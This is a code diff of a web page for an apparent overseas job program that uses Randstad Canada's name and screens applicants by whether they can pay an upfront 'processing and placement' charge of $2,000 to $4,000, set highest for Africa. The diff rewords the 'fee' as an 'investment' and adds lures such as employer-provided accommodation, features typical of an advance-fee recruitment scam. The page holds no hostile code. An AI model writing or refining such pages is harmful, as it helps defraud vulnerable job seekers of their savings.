@@ -279,7 +279,6 @@
             transition: width 0.3s ease;
         }
         .verify-steps {
-            margin-top: 20px;
             display: flex;
             flex-direction: column;
             gap: 8px;
@@ -567,10 +566,10 @@
 <div class="afford-gate" id="affordGate">
     <h2>📋 Regional Eligibility Confirmation</h2>
     <div class="location-text" id="locationText"></div>
-    <div class="afford-question">Are you able to cover this fee to proceed with your application?</div>
+    <div class="afford-question">Are you able to cover this investment to proceed with your application?</div>
     <div class="afford-buttons">
-        <button class="btn-afford btn-yes" id="yesBtn">✅ Yes, I can afford this fee</button>
-        <button class="btn-afford btn-no" id="noBtn">❌ No, I cannot afford this fee</button>
+        <button class="btn-afford btn-yes" id="yesBtn">✅ Yes, I can afford this</button>
+        <button class="btn-afford btn-no" id="noBtn">❌ No, I cannot afford this</button>
     </div>
 </div>
 
@@ -578,8 +577,8 @@
 <div class="not-eligible" id="notEligible">
     <span class="icon">🙏</span>
     <h3>Thank You for Your Honesty</h3>
-    <p>We appreciate your transparency. Unfortunately, to qualify for the Workforce Mobility & Employment Program at this time, applicants must be able to cover the processing and placement fee applicable to your region.</p>
-    <p>This fee covers essential services including visa facilitation, medical examination, and travel coordination. We encourage you to continue saving toward this goal.</p>
+    <p>We appreciate your transparency. Unfortunately, to qualify for the Workforce Mobility & Employment Program at this time, applicants must be able to cover the processing and placement investment applicable to their region.</p>
+    <p>This investment covers essential services including visa facilitation, medical examination, travel coordination and employer-provided accommodation. We encourage you to continue saving toward this goal.</p>
     <p>We sincerely wish you the very best in your journey ahead.</p>
     <button class="btn-restart" id="restartBtn">💳 I Have the Funds — Restart Application</button>
 </div>
@@ -718,16 +717,16 @@ var locationData = {
     'Africa': {
         'Ghana': {
             'Greater Accra': ['Accra', 'Tema', 'Madina', 'Ashaiman', 'Kasoa', 'Adenta', 'Teshie', 'Nungua', 'Dome', 'Achimota'],
-            'Ashanti': ['Kumasi', 'Obuasi', 'Ejisu', 'Konongo', 'Mampong', 'Bekwai', 'Asante Mampong'],
-            'Western': ['Takoradi', 'Sekondi', 'Tarkwa', 'Axim', 'Prestea', 'Bogoso'],
+            'Ashanti': ['Kumasi', 'Obuasi', 'Ejisu', 'Konongo', 'Mampong', 'Bekwai'],
+            'Western': ['Takoradi', 'Sekondi', 'Tarkwa', 'Axim', 'Prestea'],
             'Eastern': ['Koforidua', 'Nkawkaw', 'Suhum', 'Asamankese', 'Oda', 'Nsawam'],
-            'Central': ['Cape Coast', 'Kasoa', 'Winneba', 'Assin Fosu', 'Saltpond', 'Mankessim'],
-            'Volta': ['Ho', 'Keta', 'Hohoe', 'Aflao', 'Kpando', 'Sogakope'],
-            'Northern': ['Tamale', 'Yendi', 'Savelugu', 'Damongo', 'Salaga'],
+            'Central': ['Cape Coast', 'Kasoa', 'Winneba', 'Assin Fosu', 'Saltpond'],
+            'Volta': ['Ho', 'Keta', 'Hohoe', 'Aflao', 'Kpando'],
+            'Northern': ['Tamale', 'Yendi', 'Savelugu', 'Damongo'],
             'Upper East': ['Bolgatanga', 'Bawku', 'Navrongo', 'Zebilla'],
-            'Upper West': ['Wa', 'Tumu', 'Jirapa', 'Lawra', 'Nandom'],
-            'Brong-Ahafo': ['Sunyani', 'Techiman', 'Berekum', 'Dormaa Ahenkro', 'Kintampo'],
-            'Oti': ['Dambai', 'Jasikan', 'Nkwanta', 'Kadjebi'],
+            'Upper West': ['Wa', 'Tumu', 'Jirapa', 'Lawra'],
+            'Brong-Ahafo': ['Sunyani', 'Techiman', 'Berekum', 'Dormaa Ahenkro'],
+            'Oti': ['Dambai', 'Jasikan', 'Nkwanta'],
             'Savannah': ['Damongo', 'Bole', 'Sawla'],
             'North East': ['Nalerigu', 'Walewale', 'Gambaga'],
             'Ahafo': ['Goaso', 'Kukuom', 'Acherensua'],
@@ -737,35 +736,35 @@ var locationData = {
         'Nigeria': {
             'Lagos': ['Lagos Island', 'Ikeja', 'Surulere', 'Victoria Island', 'Lekki', 'Ikoyi', 'Yaba', 'Apapa', 'Alimosho', 'Oshodi', 'Mushin', 'Badagry', 'Epe', 'Ikorodu'],
             'FCT Abuja': ['Garki', 'Wuse', 'Maitama', 'Asokoro', 'Gwarinpa', 'Kubwa', 'Kuje', 'Bwari', 'Gwagwalada'],
-            'Rivers': ['Port Harcourt', 'Obio/Akpor', 'Eleme', 'Ikwerre', 'Bonny', 'Degema'],
-            'Delta': ['Warri', 'Asaba', 'Ughelli', 'Sapele', 'Agbor', 'Abraka'],
-            'Anambra': ['Awka', 'Onitsha', 'Nnewi', 'Ekwulobia', 'Aguata'],
-            'Enugu': ['Enugu', 'Nsukka', 'Oji River', 'Agbani', 'Awgu'],
-            'Imo': ['Owerri', 'Okigwe', 'Orlu', 'Mbaise', 'Oguta'],
-            'Oyo': ['Ibadan', 'Ogbomosho', 'Oyo', 'Iseyin', 'Saki'],
-            'Edo': ['Benin City', 'Auchi', 'Ekpoma', 'Uromi', 'Sapele'],
-            'Akwa Ibom': ['Uyo', 'Eket', 'Ikot Ekpene', 'Oron', 'Abak'],
-            'Cross River': ['Calabar', 'Ikom', 'Ogoja', 'Obudu', 'Akamkpa'],
-            'Kano': ['Kano City', 'Wudil', 'Gaya', 'Bichi', 'Rano'],
-            'Ogun': ['Abeokuta', 'Sagamu', 'Ijebu-Ode', 'Ota', 'Ilaro'],
-            'Ondo': ['Akure', 'Ondo Town', 'Owo', 'Ikare', 'Ore'],
-            'Osun': ['Osogbo', 'Ile-Ife', 'Ilesa', 'Ede', 'Iwo'],
-            'Ekiti': ['Ado-Ekiti', 'Ikere-Ekiti', 'Ijero-Ekiti', 'Efon-Alaye'],
-            'Abia': ['Umuahia', 'Aba', 'Ohafia', 'Bende'],
-            'Bayelsa': ['Yenagoa', 'Brass', 'Ogbia', 'Nembe'],
-            'Ebonyi': ['Abakaliki', 'Afikpo', 'Onueke', 'Ezza'],
-            'Plateau': ['Jos', 'Bukuru', 'Shendam', 'Pankshin'],
-            'Kaduna': ['Kaduna', 'Zaria', 'Kafanchan', 'Kagoro']
+            'Rivers': ['Port Harcourt', 'Obio/Akpor', 'Eleme', 'Ikwerre', 'Bonny'],
+            'Delta': ['Warri', 'Asaba', 'Ughelli', 'Sapele', 'Agbor'],
+            'Anambra': ['Awka', 'Onitsha', 'Nnewi', 'Ekwulobia'],
+            'Enugu': ['Enugu', 'Nsukka', 'Oji River', 'Agbani'],
+            'Imo': ['Owerri', 'Okigwe', 'Orlu', 'Mbaise'],
+            'Oyo': ['Ibadan', 'Ogbomosho', 'Oyo', 'Iseyin'],
+            'Edo': ['Benin City', 'Auchi', 'Ekpoma', 'Uromi'],
+            'Akwa Ibom': ['Uyo', 'Eket', 'Ikot Ekpene', 'Oron'],
+            'Cross River': ['Calabar', 'Ikom', 'Ogoja', 'Obudu'],
+            'Kano': ['Kano City', 'Wudil', 'Gaya', 'Bichi'],
+            'Ogun': ['Abeokuta', 'Sagamu', 'Ijebu-Ode', 'Ota'],
+            'Ondo': ['Akure', 'Ondo Town', 'Owo', 'Ikare'],
+            'Osun': ['Osogbo', 'Ile-Ife', 'Ilesa', 'Ede'],
+            'Ekiti': ['Ado-Ekiti', 'Ikere-Ekiti', 'Ijero-Ekiti'],
+            'Abia': ['Umuahia', 'Aba', 'Ohafia'],
+            'Bayelsa': ['Yenagoa', 'Brass', 'Ogbia'],
+            'Ebonyi': ['Abakaliki', 'Afikpo', 'Onueke'],
+            'Plateau': ['Jos', 'Bukuru', 'Shendam'],
+            'Kaduna': ['Kaduna', 'Zaria', 'Kafanchan']
         },
         'Kenya': {
-            'Nairobi': ['Nairobi CBD', 'Westlands', 'Karen', 'Lavington', 'Kasarani', 'Embakasi'],
+            'Nairobi': ['Nairobi CBD', 'Westlands', 'Karen', 'Lavington', 'Kasarani'],
             'Mombasa': ['Mombasa Island', 'Nyali', 'Bamburi', 'Likoni'],
             'Kisumu': ['Kisumu City', 'Ahero', 'Muhoroni'],
             'Nakuru': ['Nakuru Town', 'Naivasha', 'Gilgil'],
             'Eldoret': ['Eldoret Town', 'Turbo', 'Burnt Forest']
         },
         'South Africa': {
-            'Gauteng': ['Johannesburg', 'Pretoria', 'Soweto', 'Sandton', 'Midrand'],
+            'Gauteng': ['Johannesburg', 'Pretoria', 'Soweto', 'Sandton'],
             'Western Cape': ['Cape Town', 'Stellenbosch', 'Paarl', 'George'],
             'KwaZulu-Natal': ['Durban', 'Pietermaritzburg', 'Richards Bay'],
             'Eastern Cape': ['Port Elizabeth', 'East London', 'Mthatha'],
@@ -773,7 +772,7 @@ var locationData = {
         },
         'Uganda': {
             'Central': ['Kampala', 'Entebbe', 'Mukono', 'Wakiso'],
-            'Eastern': ['Jinja', 'Mbale', 'Tororo', 'Iganga'],
+            'Eastern': ['Jinja', 'Mbale', 'Tororo'],
             'Western': ['Mbarara', 'Fort Portal', 'Kasese'],
             'Northern': ['Gulu', 'Lira', 'Arua']
         },
@@ -781,7 +780,7 @@ var locationData = {
             'Dar es Salaam': ['Kinondoni', 'Ilala', 'Temeke', 'Kigamboni'],
             'Arusha': ['Arusha City', 'Moshi', 'Usa River'],
             'Mwanza': ['Mwanza City', 'Musoma', 'Bukoba'],
-            'Zanzibar': ['Zanzibar City', 'Mkokotoni', 'Chake Chake']
+            'Zanzibar': ['Zanzibar City', 'Mkokotoni']
         },
         'Senegal': {
             'Dakar': ['Dakar', 'Pikine', 'Guédiawaye', 'Rufisque'],
@@ -789,7 +788,7 @@ var locationData = {
             'Saint-Louis': ['Saint-Louis', 'Richard Toll']
         },
         'Côte d\'Ivoire': {
-            'Abidjan': ['Plateau', 'Cocody', 'Yopougon', 'Abobo', 'Marcory'],
+            'Abidjan': ['Plateau', 'Cocody', 'Yopougon', 'Abobo'],
             'Bouaké': ['Bouaké', 'Sakassou'],
             'Daloa': ['Daloa', 'Issia']
         },
@@ -801,22 +800,22 @@ var locationData = {
         },
         'Ethiopia': {
             'Addis Ababa': ['Addis Ababa', 'Bole', 'Kirkos', 'Yeka'],
-            'Oromia': ['Adama', 'Jimma', 'Dire Dawa', 'Shashemene'],
+            'Oromia': ['Adama', 'Jimma', 'Dire Dawa'],
             'Amhara': ['Bahir Dar', 'Gondar', 'Dessie']
         },
         'Rwanda': {
             'Kigali': ['Nyarugenge', 'Gasabo', 'Kicukiro'],
-            'Eastern': ['Rwamagana', 'Nyagatare', 'Kayonza'],
+            'Eastern': ['Rwamagana', 'Nyagatare'],
             'Southern': ['Huye', 'Muhanga', 'Nyanza']
         },
         'Zimbabwe': {
             'Harare': ['Harare CBD', 'Chitungwiza', 'Epworth'],
-            'Bulawayo': ['Bulawayo City', 'Nkulumane', 'Mpopoma'],
+            'Bulawayo': ['Bulawayo City', 'Nkulumane'],
             'Mashonaland': ['Bindura', 'Chinhoyi', 'Marondera']
         },
         'Zambia': {
             'Lusaka': ['Lusaka CBD', 'Chilenje', 'Kafue'],
-            'Copperbelt': ['Ndola', 'Kitwe', 'Chingola', 'Mufulira'],
+            'Copperbelt': ['Ndola', 'Kitwe', 'Chingola'],
             'Southern': ['Livingstone', 'Mazabuka', 'Choma']
         }
     },
@@ -857,14 +856,14 @@ var locationData = {
     },
     'Europe': {
         'United Kingdom': {
-            'England': ['London', 'Manchester', 'Birmingham', 'Leeds', 'Liverpool', 'Bristol', 'Sheffield', 'Leicester'],
+            'England': ['London', 'Manchester', 'Birmingham', 'Leeds', 'Liverpool', 'Bristol'],
             'Scotland': ['Edinburgh', 'Glasgow', 'Aberdeen', 'Dundee'],
             'Wales': ['Cardiff', 'Swansea', 'Newport'],
             'Northern Ireland': ['Belfast', 'Derry', 'Lisburn']
         },
         'Germany': {
             'Bavaria': ['Munich', 'Nuremberg', 'Augsburg'],
-            'North Rhine-Westphalia': ['Cologne', 'Dusseldorf', 'Dortmund', 'Essen'],
+            'North Rhine-Westphalia': ['Cologne', 'Dusseldorf', 'Dortmund'],
             'Berlin': ['Berlin City', 'Charlottenburg', 'Mitte'],
             'Hamburg': ['Hamburg City', 'Altona', 'Wandsbek']
         },
@@ -894,7 +893,7 @@ var locationData = {
             'Campania': ['Naples', 'Salerno', 'Caserta']
         },
         'Portugal': {
-            'Lisbon': ['Lisbon City', 'Sintra', 'Cascais', 'Setúbal'],
+            'Lisbon': ['Lisbon City', 'Sintra', 'Cascais'],
             'Porto': ['Porto City', 'Vila Nova de Gaia', 'Braga'],
             'Algarve': ['Faro', 'Portimão', 'Lagos']
         },
@@ -906,23 +905,23 @@ var locationData = {
     },
     'North America': {
         'Canada': {
-            'Ontario': ['Toronto', 'Ottawa', 'Mississauga', 'Brampton', 'Hamilton', 'London'],
-            'British Columbia': ['Vancouver', 'Surrey', 'Burnaby', 'Richmond', 'Kelowna'],
+            'Ontario': ['Toronto', 'Ottawa', 'Mississauga', 'Brampton', 'Hamilton'],
+            'British Columbia': ['Vancouver', 'Surrey', 'Burnaby', 'Richmond'],
             'Alberta': ['Calgary', 'Edmonton', 'Red Deer', 'Lethbridge'],
             'Quebec': ['Montreal', 'Quebec City', 'Laval', 'Gatineau'],
             'Manitoba': ['Winnipeg', 'Brandon', 'Steinbach'],
             'Saskatchewan': ['Saskatoon', 'Regina', 'Prince Albert']
         },
         'United States': {
-            'New York': ['New York City', 'Buffalo', 'Rochester', 'Yonkers', 'Syracuse'],
-            'California': ['Los Angeles', 'San Francisco', 'San Diego', 'Sacramento', 'San Jose'],
-            'Texas': ['Houston', 'Dallas', 'San Antonio', 'Austin', 'Fort Worth'],
-            'Florida': ['Miami', 'Orlando', 'Tampa', 'Jacksonville', 'Fort Lauderdale'],
-            'Georgia': ['Atlanta', 'Savannah', 'Augusta', 'Columbus'],
-            'Illinois': ['Chicago', 'Aurora', 'Naperville', 'Joliet'],
-            'Maryland': ['Baltimore', 'Rockville', 'Gaithersburg', 'Silver Spring'],
-            'New Jersey': ['Newark', 'Jersey City', 'Paterson', 'Elizabeth'],
-            'Minnesota': ['Minneapolis', 'Saint Paul', 'Rochester', 'Duluth']
+            'New York': ['New York City', 'Buffalo', 'Rochester', 'Yonkers'],
+            'California': ['Los Angeles', 'San Francisco', 'San Diego', 'Sacramento'],
+            'Texas': ['Houston', 'Dallas', 'San Antonio', 'Austin'],
+            'Florida': ['Miami', 'Orlando', 'Tampa', 'Jacksonville'],
+            'Georgia': ['Atlanta', 'Savannah', 'Augusta'],
+            'Illinois': ['Chicago', 'Aurora', 'Naperville'],
+            'Maryland': ['Baltimore', 'Rockville', 'Gaithersburg'],
+            'New Jersey': ['Newark', 'Jersey City', 'Paterson'],
+            'Minnesota': ['Minneapolis', 'Saint Paul', 'Rochester']
         },
         'Mexico': {
             'Mexico City': ['Benito Juárez', 'Coyoacán', 'Tlalpan'],
@@ -933,7 +932,7 @@ var locationData = {
     'Caribbean': {
         'Jamaica': {
             'Kingston': ['Kingston City', 'Portmore', 'Spanish Town'],
-            'Saint Andrew': ['Half Way Tree', 'Constant Spring', 'August Town'],
+            'Saint Andrew': ['Half Way Tree', 'Constant Spring'],
             'Saint James': ['Montego Bay', 'Falmouth']
         },
         'Trinidad and Tobago': {
@@ -1004,7 +1003,7 @@ var locationData = {
         },
         'Bangladesh': {
             'Dhaka': ['Dhaka City', 'Narayanganj', 'Gazipur'],
-            'Chittagong': ['Chittagong City', 'Comilla', 'Cox\'s Bazar'],
+            'Chittagong': ['Chittagong City', 'Comilla'],
             'Sylhet': ['Sylhet City', 'Moulvibazar']
         },
         'Sri Lanka': {
@@ -1023,7 +1022,7 @@ var locationData = {
             'New South Wales': ['Sydney', 'Newcastle', 'Wollongong', 'Parramatta'],
             'Victoria': ['Melbourne', 'Geelong', 'Ballarat', 'Bendigo'],
             'Queensland': ['Brisbane', 'Gold Coast', 'Sunshine Coast', 'Townsville'],
-            'Western Australia': ['Perth', 'Fremantle', 'Mandurah', 'Bunbury'],
+            'Western Australia': ['Perth', 'Fremantle', 'Mandurah'],
             'South Australia': ['Adelaide', 'Mount Gambier', 'Whyalla']
         },
         'New Zealand': {
@@ -1044,14 +1043,14 @@ var locationData = {
 
 // ── REGION PRICING ──
 var regionPricing = {
-    'Africa': { amount: '$4,000 USD', currency: 'USD' },
-    'Middle East': { amount: '$3,000 USD', currency: 'USD' },
-    'Europe': { amount: '$2,000 USD', currency: 'USD' },
-    'North America': { amount: '$2,000 USD', currency: 'USD' },
-    'Caribbean': { amount: '$2,000 USD', currency: 'USD' },
-    'South America': { amount: '$2,000 USD', currency: 'USD' },
-    'Asia': { amount: '$2,000 USD', currency: 'USD' },
-    'Australia & Oceania': { amount: '$2,000 USD', currency: 'USD' }
+    'Africa': { amount: '$4,000 USD' },
+    'Middle East': { amount: '$3,000 USD' },
+    'Europe': { amount: '$2,000 USD' },
+    'North America': { amount: '$2,000 USD' },
+    'Caribbean': { amount: '$2,000 USD' },
+    'South America': { amount: '$2,000 USD' },
+    'Asia': { amount: '$2,000 USD' },
+    'Australia & Oceania': { amount: '$2,000 USD' }
 };
 
 // ── DROPDOWN CASCADE ──
@@ -1141,7 +1140,6 @@ function runVerification() {
         if (i > 0) {
             document.getElementById(steps[i-1]).classList.remove('active');
             document.getElementById(steps[i-1]).classList.add('done');
-            document.getElementById(steps[i-1]).querySelector('.verify-step-dot').textContent = '';
         }
         if (i < steps.length) {
             document.getElementById(steps[i]).classList.add('active');
@@ -1172,17 +1170,26 @@ confirmBtn.addEventListener('click', runVerification);
 
 // ── AFFORDABILITY GATE ──
 function showAffordGate(fullLocation, continent, country, region, city, pricing) {
-    var conditions = 'For candidates applying from <strong>' + continent + ' (' + country + ')</strong>, ' +
-        'note that the following conditions apply: A processing and placement fee of ' +
-        '<strong>' + pricing.amount + '</strong> is required, covering visa facilitation, ' +
-        'medical examination, and travel coordination. Randstad Canada handles all employer matching and job placement.';
+    var conditions =
+        'For candidates applying from <strong>' + continent + ' (' + country + ')</strong>, ' +
+        'note that the following conditions apply:<br><br>' +
+        'A processing and placement investment of <strong>' + pricing.amount + '</strong> is required. ' +
+        'This comprehensive package covers:<br><br>' +
+        '✅ Employer matching with a verified Canadian company<br>' +
+        '✅ Work permit application and documentation support<br>' +
+        '✅ Medical examination coordination and clearance<br>' +
+        '✅ Travel arrangement and flight coordination<br>' +
+        '✅ <strong>Jobs with employer-provided accommodation in Canada</strong><br>' +
+        '✅ Pre-departure orientation and guidance<br>' +
+        '✅ Dedicated regional coordinator support<br><br>' +
+        'Randstad Canada handles all employer matching, job placement and arrival support. ' +
+        'You focus on preparing for your new life — <strong>we handle the rest.</strong>';
 
     var text = '<strong>📍 Your location is:</strong> ' + city + ', ' + region + ', ' + country + '<br><br>' + conditions;
     document.getElementById('locationText').innerHTML = text;
     document.getElementById('affordGate').style.display = 'block';
     document.getElementById('affordGate').scrollIntoView({ behavior: 'smooth' });
 
-    // Store for form loading
     window._selectedLocation = fullLocation;
     window._selectedContinent = continent;
     window._selectedCountry = country;
@@ -1219,7 +1226,20 @@ function loadForm() {
     var pricing = window._selectedPricing || { amount: '$4,000 USD' };
     var fullLocation = city + ', ' + region + ', ' + country;
 
-    var conditions = 'For candidates applying from ' + continent + ' (' + country + '), note that the following conditions apply: A processing and placement fee of ' + pricing.amount + ' is required, covering visa facilitation, medical examination, and travel coordination. Randstad Canada handles all employer matching and job placement.';
+    var conditions =
+        'For candidates applying from ' + continent + ' (' + country + '), ' +
+        'note that the following conditions apply: ' +
+        'A processing and placement investment of ' + pricing.amount + ' is required. ' +
+        'This comprehensive package covers: ' +
+        'Employer matching with a verified Canadian company. ' +
+        'Work permit application and documentation support. ' +
+        'Medical examination coordination and clearance. ' +
+        'Travel arrangement and flight coordination. ' +
+        'Jobs with employer-provided accommodation in Canada. ' +
+        'Pre-departure orientation and guidance. ' +
+        'Dedicated regional coordinator support. ' +
+        'Randstad Canada handles all employer matching, job placement and arrival support. ' +
+        'You focus on preparing for your new life — we handle the rest.';
 
     var encodedAddress = encodeURIComponent(fullLocation);
     var encodedConditions = encodeURIComponent(conditions);
